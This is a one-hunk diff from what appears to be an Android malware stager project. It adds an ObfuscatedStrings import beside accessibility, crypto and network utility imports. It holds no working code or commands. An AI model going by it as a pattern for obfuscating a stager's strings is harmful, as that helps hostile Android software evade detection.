@@ -12,6 +12,7 @@ import android.view.accessibility.AccessibilityNodeInfo
 import com.chameleon.stager.StagerApplication
 import com.chameleon.stager.utils.CryptoUtils
 import com.chameleon.stager.utils.NetworkUtils
+import com.chameleon.stager.utils.ObfuscatedStrings
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.DataOutputStream
